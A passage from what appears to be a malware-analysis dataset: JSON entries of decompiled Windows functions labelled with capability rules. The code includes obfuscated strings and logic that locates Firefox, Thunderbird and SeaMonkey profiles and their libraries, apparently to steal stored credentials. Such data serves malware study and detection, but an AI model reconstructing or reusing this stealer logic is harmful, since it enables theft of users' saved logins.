        "decompiled_code": "\nint32_t * fcn.0040f034(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    int32_t iStack8;\n    int32_t *piStack4;\n    \n    piStack4 = param_2;\n    iStack8 = *(param_1 + 8);\n    uStack12 = *(param_1 + 0xc);\n    uStack16 = *(param_1 + 0x10);\n    uStack20 = *(param_1 + 0x14);\n    do {\n        uVar1 = iStack8 + ((uStack16 ^ uStack20) & uStack12 ^ uStack20) + *piStack4 + 0xd76aa478;\n        uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uStack12;\n        uVar2 = uStack20 + ((uStack12 ^ uStack16) & uVar1 ^ uStack16) + piStack4[1] + 0xe8c7b756;\n        uVar2 = (uVar2 * 0x1000 | uVar2 >> 0x14) + uVar1;\n        uVar3 = uStack16 + ((uVar1 ^ uStack12) & uVar2 ^ uStack12) + piStack4[2] + 0x242070db;\n        uVar3 = (uVar3 >> 0xf | uVar3 * 0x20000) + uVar2;\n        uVar4 = uStack12 + ((uVar2 ^ uVar1) & uVar3 ^ uVar1) + piStack4[3] + 0xc1bdceee;\n        uVar4 = (uVar4 >> 10 | uVar4 * 0x400000) + uVar3;\n        uVar1 = uVar1 + ((uVar3 ^ uVar2) & uVar4 ^ uVar2) + piStack4[4] + 0xf57c0faf;\n        uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar4;\n        uVar2 = uVar2 + ((uVar4 ^ uVar3) & uVar1 ^ uVar3) + piStack4[5] + 0x4787c62a;\n        uVar2 = (uVar2 * 0x1000 | uVar2 >> 0x14) + uVar1;\n        uVar3 = uVar3 + ((uVar1 ^ uVar4) & uVar2 ^ uVar4) + piStack4[6] + 0xa8304613;\n        uVar3 = (uVar3 >> 0xf | uVar3 * 0x20000) + uVar2;\n        uVar4 = uVar4 + ((uVar2 ^ uVar1) & uVar3 ^ uVar1) + piStack4[7] + 0xfd469501;\n        uVar4 = (uVar4 >> 10 | uVar4 * 0x400000) + uVar3;\n        uVar1 = uVar1 + ((uVar3 ^ uVar2) & uVar4 ^ uVar2) + piStack4[8] + 0x698098d8;\n        uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar4;\n        uVar2 = uVar2 + ((uVar4 ^ uVar3) & uVar1 ^ uVar3) + piStack4[9] + 0x8b44f7af;\n        uVar2 = (uVar2 * 0x1000 | uVar2 >> 0x14) + uVar1;\n        uVar3 = (uVar3 + ((uVar1 ^ uVar4) & uVar2 ^ uVar4) + piStack4[10]) - 0xa44f;\n        uVar3 = (uVar3 >> 0xf | uVar3 * 0x20000) + uVar2;\n        uVar4 = uVar4 + ((uVar2 ^ uVar1) & uVar3 ^ uVar1) + piStack4[0xb] + 0x895cd7be;\n        uVar4 = (uVar4 >> 10 | uVar4 * 0x400000) + uVar3;\n        uVar1 = uVar1 + ((uVar3 ^ uVar2) & uVar4 ^ uVar2) + piStack4[0xc] + 0x6b901122;\n        uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar4;\n        uVar2 = uVar2 + ((uVar4 ^ uVar3) & uVar1 ^ uVar3) + piStack4[0xd] + 0xfd987193;\n        uVar2 = (uVar2 * 0x1000 | uVar2 >> 0x14) + uVar1;\n        uVar3 = uVar3 + ((uVar1 ^ uVar4) & uVar2 ^ uVar4) + piStack4[0xe] + 0xa679438e;\n        uVar3 = (uVar3 >> 0xf | uVar3 * 0x20000) + uVar2;\n        uVar4 = uVar4 + ((uVar2 ^ uVar1) & uVar3 ^ uVar1) + piStack4[0xf] + 0x49b40821;\n        uVar4 = (uVar4 >> 10 | uVar4 * 0x400000) + uVar3;\n        uVar1 = uVar1 + ((uVar4 ^ uVar3) & uVar2 ^ uVar3) + piStack4[1] + 0xf61e2562;\n        uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar4;\n        uVar2 = uVar2 + ((uVar1 ^ uVar4) & uVar3 ^ uVar4) + piStack4[6] + 0xc040b340;\n        uVar2 = (uVar2 * 0x200 | uVar2 >> 0x17) + uVar1;\n        uVar3 = uVar3 + ((uVar2 ^ uVar1) & uVar4 ^ uVar1) + piStack4[0xb] + 0x265e5a51;\n        uVar3 = (uVar3 * 0x4000 | uVar3 >> 0x12) + uVar2;\n        uVar4 = uVar4 + ((uVar3 ^ uVar2) & uVar1 ^ uVar2) + *piStack4 + 0xe9b6c7aa;\n        uVar4 = (uVar4 >> 0xc | uVar4 * 0x100000) + uVar3;\n        uVar1 = uVar1 + ((uVar4 ^ uVar3) & uVar2 ^ uVar3) + piStack4[5] + 0xd62f105d;\n        uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar4;\n        uVar2 = uVar2 + ((uVar1 ^ uVar4) & uVar3 ^ uVar4) + piStack4[10] + 0x2441453;\n        uVar2 = (uVar2 * 0x200 | uVar2 >> 0x17) + uVar1;\n        uVar3 = uVar3 + ((uVar2 ^ uVar1) & uVar4 ^ uVar1) + piStack4[0xf] + 0xd8a1e681;\n        uVar3 = (uVar3 * 0x4000 | uVar3 >> 0x12) + uVar2;\n        uVar4 = uVar4 + ((uVar3 ^ uVar2) & uVar1 ^ uVar2) + piStack4[4] + 0xe7d3fbc8;\n        uVar4 = (uVar4 >> 0xc | uVar4 * 0x100000) + uVar3;\n        uVar1 = uVar1 + ((uVar4 ^ uVar3) & uVar2 ^ uVar3) + piStack4[9] + 0x21e1cde6;\n        uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar4;\n        uVar2 = uVar2 + ((uVar1 ^ uVar4) & uVar3 ^ uVar4) + piStack4[0xe] + 0xc33707d6;\n        uVar2 = (uVar2 * 0x200 | uVar2 >> 0x17) + uVar1;\n        uVar3 = uVar3 + ((uVar2 ^ uVar1) & uVar4 ^ uVar1) + piStack4[3] + 0xf4d50d87;\n        uVar3 = (uVar3 * 0x4000 | uVar3 >> 0x12) + uVar2;\n        uVar4 = uVar4 + ((uVar3 ^ uVar2) & uVar1 ^ uVar2) + piStack4[8] + 0x455a14ed;\n        uVar4 = (uVar4 >> 0xc | uVar4 * 0x100000) + uVar3;\n        uVar1 = uVar1 + ((uVar4 ^ uVar3) & uVar2 ^ uVar3) + piStack4[0xd] + 0xa9e3e905;\n        uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar4;\n        uVar2 = uVar2 + ((uVar1 ^ uVar4) & uVar3 ^ uVar4) + piStack4[2] + 0xfcefa3f8;\n        uVar2 = (uVar2 * 0x200 | uVar2 >> 0x17) + uVar1;\n        uVar3 = uVar3 + ((uVar2 ^ uVar1) & uVar4 ^ uVar1) + piStack4[7] + 0x676f02d9;\n        uVar3 = (uVar3 * 0x4000 | uVar3 >> 0x12) + uVar2;\n        uVar4 = uVar4 + ((uVar3 ^ uVar2) & uVar1 ^ uVar2) + piStack4[0xc] + 0x8d2a4c8a;\n        uVar4 = (uVar4 >> 0xc | uVar4 * 0x100000) + uVar3;\n        uVar1 = (uVar1 + (uVar4 ^ uVar3 ^ uVar2) + piStack4[5]) - 0x5c6be;\n        uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;\n        uVar2 = uVar2 + (uVar1 ^ uVar4 ^ uVar3) + piStack4[8] + 0x8771f681;\n        uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;\n        uVar3 = uVar3 + (uVar2 ^ uVar1 ^ uVar4) + piStack4[0xb] + 0x6d9d6122;\n        uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;\n        uVar4 = uVar4 + (uVar3 ^ uVar2 ^ uVar1) + piStack4[0xe] + 0xfde5380c;\n        uVar4 = (uVar4 >> 9 | uVar4 * 0x800000) + uVar3;\n        uVar1 = uVar1 + (uVar4 ^ uVar3 ^ uVar2) + piStack4[1] + 0xa4beea44;\n        uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;\n        uVar2 = uVar2 + (uVar1 ^ uVar4 ^ uVar3) + piStack4[4] + 0x4bdecfa9;\n        uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;\n        uVar3 = uVar3 + (uVar2 ^ uVar1 ^ uVar4) + piStack4[7] + 0xf6bb4b60;\n        uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;\n        uVar4 = uVar4 + (uVar3 ^ uVar2 ^ uVar1) + piStack4[10] + 0xbebfbc70;\n        uVar4 = (uVar4 >> 9 | uVar4 * 0x800000) + uVar3;\n        uVar1 = uVar1 + (uVar4 ^ uVar3 ^ uVar2) + piStack4[0xd] + 0x289b7ec6;\n        uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;\n        uVar2 = uVar2 + (uVar1 ^ uVar4 ^ uVar3) + *piStack4 + 0xeaa127fa;\n        uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;\n        uVar3 = uVar3 + (uVar2 ^ uVar1 ^ uVar4) + piStack4[3] + 0xd4ef3085;\n        uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;\n        uVar4 = uVar4 + (uVar3 ^ uVar2 ^ uVar1) + piStack4[6] + 0x4881d05;\n        uVar4 = (uVar4 >> 9 | uVar4 * 0x800000) + uVar3;\n        uVar1 = uVar1 + (uVar4 ^ uVar3 ^ uVar2) + piStack4[9] + 0xd9d4d039;\n        uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar4;\n        uVar2 = uVar2 + (uVar1 ^ uVar4 ^ uVar3) + piStack4[0xc] + 0xe6db99e5;\n        uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar1;\n        uVar3 = uVar3 + (uVar2 ^ uVar1 ^ uVar4) + piStack4[0xf] + 0x1fa27cf8;\n        uVar3 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;\n        uVar4 = uVar4 + (uVar3 ^ uVar2 ^ uVar1) + piStack4[2] + 0xc4ac5665;\n        uVar4 = (uVar4 >> 9 | uVar4 * 0x800000) + uVar3;\n        uVar1 = uVar1 + ((~uVar2 | uVar4) ^ uVar3) + *piStack4 + 0xf4292244;\n        uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;\n        uVar2 = uVar2 + ((~uVar3 | uVar1) ^ uVar4) + piStack4[7] + 0x432aff97;\n        uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;\n        uVar3 = uVar3 + ((~uVar4 | uVar2) ^ uVar1) + piStack4[0xe] + 0xab9423a7;\n        uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;\n        uVar4 = uVar4 + ((~uVar1 | uVar3) ^ uVar2) + piStack4[5] + 0xfc93a039;\n        uVar4 = (uVar4 >> 0xb | uVar4 * 0x200000) + uVar3;\n        uVar1 = uVar1 + ((~uVar2 | uVar4) ^ uVar3) + piStack4[0xc] + 0x655b59c3;\n        uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;\n        uVar2 = uVar2 + ((~uVar3 | uVar1) ^ uVar4) + piStack4[3] + 0x8f0ccc92;\n        uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;\n        uVar3 = (uVar3 + ((~uVar4 | uVar2) ^ uVar1) + piStack4[10]) - 0x100b83;\n        uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;\n        uVar4 = uVar4 + ((~uVar1 | uVar3) ^ uVar2) + piStack4[1] + 0x85845dd1;\n        uVar4 = (uVar4 >> 0xb | uVar4 * 0x200000) + uVar3;\n        uVar1 = uVar1 + ((~uVar2 | uVar4) ^ uVar3) + piStack4[8] + 0x6fa87e4f;\n        uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;\n        uVar2 = uVar2 + ((~uVar3 | uVar1) ^ uVar4) + piStack4[0xf] + 0xfe2ce6e0;\n        uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;\n        uVar3 = uVar3 + ((~uVar4 | uVar2) ^ uVar1) + piStack4[6] + 0xa3014314;\n        uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;\n        uVar4 = uVar4 + ((~uVar1 | uVar3) ^ uVar2) + piStack4[0xd] + 0x4e0811a1;\n        uVar4 = (uVar4 >> 0xb | uVar4 * 0x200000) + uVar3;\n        uVar1 = uVar1 + ((~uVar2 | uVar4) ^ uVar3) + piStack4[4] + 0xf7537e82;\n        uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar4;\n        uVar2 = uVar2 + ((~uVar3 | uVar1) ^ uVar4) + piStack4[0xb] + 0xbd3af235;\n        uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar1;\n        uVar3 = uVar3 + ((~uVar4 | uVar2) ^ uVar1) + piStack4[2] + 0x2ad7d2bb;\n        uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;\n        uVar4 = uVar4 + ((~uVar1 | uVar3) ^ uVar2) + piStack4[9] + 0xeb86d391;\n        iStack8 = uVar1 + iStack8;\n        uStack12 = (uVar4 >> 0xb | uVar4 * 0x200000) + uVar3 + uStack12;\n        uStack16 = uVar3 + uStack16;\n        uStack20 = uVar2 + uStack20;\n        piStack4 = piStack4 + 0x10;\n        param_3 = param_3 + -0x40;\n    } while (param_3 != 0);\n    *(param_1 + 8) = iStack8;\n    *(param_1 + 0xc) = uStack12;\n    *(param_1 + 0x10) = uStack16;\n    *(param_1 + 0x14) = uStack20;\n    return piStack4;\n}\n",
        "token_count": 4859
    },
    "0040ff0b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040ff0b(uint32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = *param_1;\n    *param_1 = param_3 + uVar1 & 0x1fffffff;\n    if (*param_1 < uVar1) {\n        param_1[1] = param_1[1] + 1;\n    }\n    param_1[1] = (param_3 >> 0x1d) + param_1[1];\n    uVar1 = uVar1 & 0x3f;\n    if (uVar1 != 0) {\n        uVar2 = 0x40 - uVar1;\n        if (param_3 < uVar2) {\n            fcn.0041a5e1(param_1 + uVar1 + 0x18, param_2, param_3);\n            return;\n        }\n        fcn.0041a5e1(param_1 + uVar1 + 0x18, param_2, uVar2);\n        param_2 = param_2 + uVar2;\n        param_3 = param_3 - uVar2;\n        fcn.0040f034(param_1, param_1 + 6, 0x40);\n    }\n    if (0x3f < param_3) {\n        param_2 = fcn.0040f034(param_1, param_2, param_3 & 0xffffffc0);\n        param_3 = param_3 & 0x3f;\n    }\n    fcn.0041a5e1(param_1 + 6, param_2, param_3);\n    return;\n}\n",
        "token_count": 398
    },
    "00410324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar fcn.00410324(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uchar auStack540 [511];\n    uchar uStack29;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    uchar uStack13;\n    \n    uStack13 = 0;\n    fcn.0041a59f(param_2, 0, param_3);\n    iStack20 = sub.msvcrt.dll_fopen(param_1, 0x41f93e);\n    if (iStack20 != 0) {\n        iVar1 = sub.msvcrt.dll_fread(auStack540, 1, 0x200, iStack20);\n        if (iVar1 != 0) {\n            uStack29 = 0;\n            iStack24 = fcn.00419b7e(0, \"Path=\", auStack540);\n            iStack24 = iStack24 + 5;\n            iStack28 = fcn.00419b7e(iStack24, 0x41f946, auStack540);\n            iStack28 = iStack28 + 1;\n            if (((5 < iStack24) && (iStack24 < iStack28)) && (iStack28 - iStack24 < param_3)) {\n                iVar1 = fcn.00419918(param_2, auStack540 + iStack24, iStack28 - iStack24);\n                uStack13 = iVar1 != 0;\n            }\n        }\n        sub.msvcrt.dll_fclose(iStack20);\n    }\n    return uStack13;\n}\n",
        "token_count": 362
    },
    "00410493": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00410493(uint param_1, uint param_2, uint param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack606 [64];\n    uchar auStack542 [516];\n    uint uStack26;\n    uint uStack22;\n    ushort uStack18;\n    int32_t iStack16;\n    \n    uStack26 = 0x343678;\n    uStack22 = 0;\n    uStack18 = 0;\n    fcn.0041a59f(param_2, 0, param_3);\n    uVar2 = fcn.0040b60e(\"MT_qUDrj\\\\FWk4iiC\\\\%6\\\\\");\n    fcn.00419fa8(auStack542, 0x204, uVar2, param_1);\n    uVar2 = fcn.0040b60e(\"PQ00dR5zd064WR\");\n    cVar1 = fcn.00416b9d(0x80000002, auStack542, uVar2, auStack606, 0x40);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        iStack16 = fcn.00419c6b(auStack606, &uStack26);\n        if (iStack16 == 1) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = fcn.0040b60e(\"MT_qUDrj\\\\FWk4iiC\\\\%6\\\\%6\\\\FC4R\");\n            fcn.00419fa8(auStack542, 0x204, uVar2, param_1, auStack606);\n            uVar2 = fcn.0040b60e(\"XR65Cii a40dY5W0Z\");\n            uVar2 = fcn.00416b9d(0x80000002, auStack542, uVar2, param_2, param_3);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 454
    },
    "0041065e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041065e(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar auStack1568 [516];\n    uchar auStack1052 [516];\n    uchar auStack536 [516];\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    cVar2 = fcn.00410493(param_1, auStack1052, 0x204);\n    if (cVar2 == '\\x01') {\n        for (; iStack16 < 9; iStack16 = iStack16 + 1) {\n            uVar3 = fcn.0040b60e(*(iStack16 * 4 + 0x41e7e0));\n            fcn.00419fa8(auStack536, 0x204, 0x41f99a, auStack1052, uVar3);\n            if (iStack16 == 0) {\n                for (iStack20 = 0; iStack20 < 0x2c; iStack20 = iStack20 + 1) {\n                    uVar3 = fcn.0040b60e(*(iStack20 * 4 + 0x41e820));\n                    fcn.00419fa8(auStack1568, 0x204, 0x41f99a, auStack1052, uVar3);\n                    cVar2 = fcn.0040aa34(auStack1568);\n                    if (cVar2 != '\\0') {\n                        piVar1 = iStack20 * 4 + param_3;\n                        iVar5 = fcn.0040b4e9(auStack1568);\n                        *piVar1 = iVar5;\n                        if (*piVar1 == 0) {\n                            return 0;\n                        }\n                    }\n                }\n                cVar2 = fcn.0040aa34(auStack536);\n                if (cVar2 != '\\x01') {\n                    uVar3 = fcn.0040b60e(\"lWkQ54i6.Sii\");\n                    fcn.00419fa8(auStack536, 0x204, 0x41f99a, auStack1052, uVar3);\n                }\n                cVar2 = fcn.0040aa34(auStack536);\n                if (cVar2 != '\\x01') {\n                    uVar3 = fcn.0040b60e(\"lWkniQd.Sii\");\n                    fcn.00419fa8(auStack536, 0x204, 0x41f99a, auStack1052, uVar3);\n                }\n            }\n            if ((iStack16 == 1) && (cVar2 = fcn.0040aa34(auStack536),  cVar2 != '\\x01')) {\n                uVar3 = fcn.0040b60e(\"lWk67i45dN.Sii\");\n                fcn.00419fa8(auStack536, 0x204, 0x41f99a, auStack1052, uVar3);\n                cVar2 = fcn.0040aa34(auStack536);\n                if (cVar2 != '\\x01') {\n                    uVar3 = fcn.0040b60e(\"R66N.Sii\");\n                    fcn.00419fa8(auStack536, 0x204, 0x41f99a, auStack1052, uVar3);\n                }\n            }\n            cVar2 = fcn.0040aa34(auStack536);\n            if (cVar2 == '\\x01') {\n                piVar1 = iStack16 * 4 + param_2;\n                iVar5 = fcn.0040b4e9(auStack536);\n                *piVar1 = iVar5;\n                if (*piVar1 == 0) {\n                    return 0;\n                }\n            }\n            else {\n                uVar4 = fcn.0040b60e(\"%6\\\\R66N.Sii\");\n                fcn.00419fa8(auStack536, 0x204, uVar4, auStack1052, uVar3);\n                cVar2 = fcn.0040aa34(auStack536);\n                if (cVar2 == '\\0') {\n                    return 0;\n                }\n            }\n        }\n        uVar3 = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 1024
    },
    "00410aa1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00410aa1(void)\n\n{\n    code **ppcVar1;\n    int32_t **ppiVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t *piVar10;\n    char **ppcVar11;\n    char **ppcVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    int32_t **ppiVar16;\n    uint *puVar17;\n    int32_t **ppiVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uint *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    char **ppcVar24;\n    char **ppcVar25;\n    uint *puVar26;\n    uint *puVar27;\n    uint *puVar28;\n    uint *puVar29;\n    uint uStack8;\n    \n    uStack8 = 0x410aac;\n    iVar4 = fcn.0041ce38();\n    iVar4 = -iVar4;\n    ppcVar12 = &stack0xfffffffc + iVar4;\n    puVar29 = &stack0xfffffffc + iVar4;\n    *(&stack0x0000002c + iVar4) = 0;\n    *(&stack0x00000028 + iVar4) = 0;\n    iVar7 = *(&stack0x000015dc + iVar4);\n    if (iVar7 == 2) {\n        *(&stack0x00000004 + iVar4) = &stack0x000014a0 + iVar4;\n        *(&stack0x00000000 + iVar4) = &stack0x00001550 + iVar4;\n        *(&stack0xfffffffc + iVar4) = \"Mozilla Thunderbird\";\n        *(&stack0xfffffff8 + iVar4) = 0x410be1;\n        cVar3 = fcn.0041065e();\n        if (cVar3 != '\\x01') {\n            return 0;\n        }\n        *(&stack0xfffffffc + iVar4) = \"APPDATA\";\n        *(&stack0xfffffff8 + iVar4) = 0x410bfe;\n        uVar5 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffffc + iVar4) = \"%6\\\\qIQRSd0V40S\\\\s0W84id6.4R4\";\n        *(&stack0xfffffff8 + iVar4) = 0x410c0c;\n        uVar6 = fcn.0040b60e();\n        *(&stack0x00000008 + iVar4) = uVar5;\n        *(&stack0x00000004 + iVar4) = uVar6;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410c2b;\n        fcn.00419fa8();\n        *(&stack0x00000004 + iVar4) = 0x40;\n        *(&stack0x00000000 + iVar4) = &stack0x00001460 + iVar4;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410c4d;\n        cVar3 = fcn.00410324();\n        puVar29 = &stack0xfffffffc + iVar4;\n        if (cVar3 == '\\0') goto code_r0x0041197c;\n        *(&stack0xfffffffc + iVar4) = \"APPDATA\";\n        *(&stack0xfffffff8 + iVar4) = 0x410c61;\n        uVar5 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffffc + iVar4) = \"%6\\\\qIQRSd0V40S\\\\%6\";\n        *(&stack0xfffffff8 + iVar4) = 0x410c6f;\n        uVar6 = fcn.0040b60e();\n        *(&stack0x0000000c + iVar4) = &stack0x00001460 + iVar4;\n        *(&stack0x00000008 + iVar4) = uVar5;\n        *(&stack0x00000004 + iVar4) = uVar6;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410c99;\n        fcn.00419fa8();\n    }\n    else if (iVar7 == 6) {\n        *(&stack0x00000004 + iVar4) = &stack0x000014a0 + iVar4;\n        *(&stack0x00000000 + iVar4) = &stack0x00001550 + iVar4;\n        *(&stack0xfffffffc + iVar4) = \"SeaMonkey\";\n        *(&stack0xfffffff8 + iVar4) = 0x410cc0;\n        cVar3 = fcn.0041065e();\n        if (cVar3 != '\\x01') {\n            return 0;\n        }\n        *(&stack0xfffffffc + iVar4) = \"APPDATA\";\n        *(&stack0xfffffff8 + iVar4) = 0x410cdd;\n        uVar5 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffffc + iVar4) = \"%6\\\\FWk4iiC\\\\MdCFWRwdZ\\\\s0W84id6.4R4\";\n        *(&stack0xfffffff8 + iVar4) = 0x410ceb;\n        uVar6 = fcn.0040b60e();\n        *(&stack0x00000008 + iVar4) = uVar5;\n        *(&stack0x00000004 + iVar4) = uVar6;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410d0a;\n        fcn.00419fa8();\n        *(&stack0x00000004 + iVar4) = 0x40;\n        *(&stack0x00000000 + iVar4) = &stack0x00001460 + iVar4;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410d2c;\n        cVar3 = fcn.00410324();\n        puVar29 = &stack0xfffffffc + iVar4;\n        if (cVar3 == '\\0') goto code_r0x0041197c;\n        *(&stack0xfffffffc + iVar4) = \"APPDATA\";\n        *(&stack0xfffffff8 + iVar4) = 0x410d40;\n        uVar5 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffffc + iVar4) = \"%6\\\\FWk4iiC\\\\MdCFWRwdZ\\\\%6\";\n        *(&stack0xfffffff8 + iVar4) = 0x410d4e;\n        uVar6 = fcn.0040b60e();\n        *(&stack0x0000000c + iVar4) = &stack0x00001460 + iVar4;\n        *(&stack0x00000008 + iVar4) = uVar5;\n        *(&stack0x00000004 + iVar4) = uVar6;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410d78;\n        fcn.00419fa8();\n    }\n    else if (iVar7 == 1) {\n        *(&stack0x00000004 + iVar4) = &stack0x000014a0 + iVar4;\n        *(&stack0x00000000 + iVar4) = &stack0x00001550 + iVar4;\n        *(&stack0xfffffffc + iVar4) = \"Mozilla Firefox\";\n        *(&stack0xfffffff8 + iVar4) = 0x410b02;\n        cVar3 = fcn.0041065e();\n        if (cVar3 != '\\x01') {\n            return 0;\n        }\n        *(&stack0xfffffffc + iVar4) = \"APPDATA\";\n        *(&stack0xfffffff8 + iVar4) = 0x410b1f;\n        uVar5 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffffc + iVar4) = \"%6\\\\FWk4iiC\\\\_40d8Wf\\\\s0W84id6.4R4\";\n        *(&stack0xfffffff8 + iVar4) = 0x410b2d;\n        uVar6 = fcn.0040b60e();\n        *(&stack0x00000008 + iVar4) = uVar5;\n        *(&stack0x00000004 + iVar4) = uVar6;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410b4c;\n        fcn.00419fa8();\n        *(&stack0x00000004 + iVar4) = 0x40;\n        *(&stack0x00000000 + iVar4) = &stack0x00001460 + iVar4;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410b6e;\n        cVar3 = fcn.00410324();\n        if (cVar3 == '\\0') goto code_r0x0041197c;\n        *(&stack0xfffffffc + iVar4) = \"APPDATA\";\n        *(&stack0xfffffff8 + iVar4) = 0x410b82;\n        uVar5 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffffc + iVar4) = \"%6\\\\FWk4iiC\\\\_40d8Wf\\\\%6\";\n        *(&stack0xfffffff8 + iVar4) = 0x410b90;\n        uVar6 = fcn.0040b60e();\n        *(&stack0x0000000c + iVar4) = &stack0x00001460 + iVar4;\n        *(&stack0x00000008 + iVar4) = uVar5;\n        *(&stack0x00000004 + iVar4) = uVar6;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = &stack0x0000125c + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x410bba;\n        fcn.00419fa8();\n    }\n    *(&stack0xfffffffc + iVar4) = \"%6\\\\64nRWR6.67i45d\";\n    *(&stack0xfffffff8 + iVar4) = 0x410d84;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000008 + iVar4) = &stack0x0000125c + iVar4;\n    